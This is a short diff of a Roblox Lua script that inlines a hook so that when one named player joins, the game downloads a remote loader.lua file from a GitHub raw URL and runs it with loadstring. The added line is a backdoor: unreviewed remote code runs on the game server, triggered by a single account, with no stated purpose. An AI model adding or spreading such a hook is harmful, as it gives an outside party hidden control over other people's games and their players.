@@ -1,11 +1,6 @@
-
-local function AdminCmds()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/LeanClient/thingy/main/loader.lua"))()
-end
-
 game.Players.PlayerAdded:Connect(function(Player)
 	if Player.Name == "ProAIt5000" then
-	AdminCmds()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LeanClient/thingy/main/loader.lua"))()
 	end
 end)
 
